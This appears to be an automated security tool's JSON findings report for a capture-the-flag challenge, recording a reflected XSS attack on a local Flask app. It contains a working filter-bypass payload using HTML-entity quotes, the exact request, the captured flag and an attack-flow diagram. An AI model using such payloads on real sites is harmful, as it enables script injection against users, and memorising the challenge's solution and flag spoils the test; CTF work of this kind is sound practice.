@@ -1,0 +1,32 @@
+{
+  "meta": {
+    "created": "2026-04-12T22:58:23.548723+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "d77d1798-6827-4b69-b436-2f314340dc05",
+      "timestamp": "2026-04-12T22:58:23.548586+00:00",
+      "title": "CTF Flag - XSS via HTML Entity Quote Bypass (Dalgona Challenge #15)",
+      "severity": "critical",
+      "target": "http://172.17.0.1:50509/page",
+      "description": "The /page endpoint reflects the 'name' GET parameter unsafely inside an HTML input value attribute. The server filters literal single-quotes (') around 'XSS', but HTML entity encoding of the single quote (&#39;) bypasses this filter. The payload breaks out of the input value attribute and injects an img tag with an onerror handler executing alert('XSS').",
+      "evidence": "GET /page?name=%22%3E%3Cimg+src%3Dx+onerror%3Dalert%28%26%2339%3BXSS%26%2339%3B%29%3E\n\nPayload: \"><img src=x onerror=alert(&#39;XSS&#39;)>\n\nServer response: Congratulations! Here is the flag: flag{7b37c981-e7c9-4520-a486-8bbbfe90e9a6}\n\nFilter bypass: The server strips literal 'XSS' (single-quoted) but HTML entity &#39; (decimal entity for single quote) survives and is decoded by the browser before JavaScript execution.",
+      "tool_used": "http_request",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "GET http://172.17.0.1:50509/page?name=%22%3E%3Cimg+src%3Dx+onerror%3Dalert%28%26%2339%3BXSS%26%2339%3B%29%3E",
+        "expected": "flag{7b37c981-e7c9-4520-a486-8bbbfe90e9a6}"
+      }
+    }
+  ],
+  "diagrams": [
+    {
+      "id": "82f1f5cc-0cbd-43b7-b7f2-62283ebbe890",
+      "timestamp": "2026-04-12T22:58:34.661116+00:00",
+      "title": "Dalgona XSS Challenge #15 - Application Architecture",
+      "mermaid": "flowchart TD\n  Browser[\"Browser (Attacker)\"] -->|\"GET /page?name=PAYLOAD\"| Flask[\"Flask App Werkzeug 3.1.8\"]\n  Flask -->|\"Reflects name param in HTML\"| InputTag[\"input value attribute\"]\n  Flask -->|\"Filters literal 'XSS' string\"| Filter[\"XSS Filter\"]\n  Filter -->|\"&#39; entity bypasses filter\"| Reflect[\"Reflected XSS in onerror handler\"]\n  Reflect -->|\"alert executes\"| Flag[\"flag{7b37c981-e7c9-4520-a486-8bbbfe90e9a6}\"]"
+    }
+  ]
+}
